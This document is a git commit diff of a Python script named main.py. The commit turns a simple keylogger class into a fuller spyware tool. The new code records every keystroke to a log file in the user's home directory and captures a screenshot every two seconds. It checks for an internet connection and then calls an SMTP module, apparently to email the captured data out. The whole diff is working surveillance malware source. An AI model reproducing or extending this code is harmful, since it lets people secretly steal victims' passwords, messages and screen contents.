86ef3aaf58756ee25f88deb8683e2694b69972d0
Said1228 <44681118+Said1228@users.noreply.github.com>
2021-02-27 00:58:34 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,36 +1,62 @@
 from pynput.keyboard import Key, Listener
+import pyautogui
+import socket
+import time
+import os
+import SMTP
+
+count = 0
+keys = []
+
+directoire = os.path.expanduser('~') + '/'
 
 
-class Keylogger:
-
-    def __init__(self):
-        self.count = 0
-        self.keys = []
-
-    def on_press(self, key):
-        print(f"{key} pressed")
-        self.keys.append(key)
-        self.count += 1
-
-        if self.count > 10:
-            self.write_file(self.keys)
-
-    def write_file(self, keys):
-        with open("sam.txt", "a") as file:
-            for key in self.keys:
-                k = str(key).replace("'", "")
-
-                if k.find("space")>0:
-                    file.write("\n")
-                elif k.find("Key") == -1:
-                    file.write(k)
-
-    def on_release(self, key):
-        if key == Key.esc:
-            return False
+def on_press(key):
+    global keys, count
+    keys.append(key)
+    count += 1
+    if count >= 10:
+        write_file(keys)
+        keys = []
 
 
-if __name__ == "__main__":
-    obj = Keylogger()
-    with Listener(on_press = obj.on_press, on_release = obj.on_release) as listener:
+def write_file(keys):
+    global directoire
+    filename = str('log.txt')
+    files = directoire + filename
+
+    with open(files, 'a') as file:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                file.write(" ")
+            elif k.find("Key") == -1:
+                file.write(k)
+            if k.find("enter") > 0:
+                file.write("\n")
+
+
+def is_connected():
+    try:
+        socket.create_connection(("www.google.com", 80))
+        return True
+    except OSError:
+        pass
+    return False
+
+
+def main(key):
+    on_press(key)
+
+
+if __name__ == '__main__':
+    with Listener(on_press=main, ) as listener:
+        while True:
+            time.sleep(2)
+            screen = pyautogui.screenshot(directoire + 'screenshot.png')
+            if is_connected() == True:
+                SMTP.SEND_MAIL()
+            if is_connected() == False:
+                pass
+            os.remove(directoire + 'screenshot.png')
         listener.join()
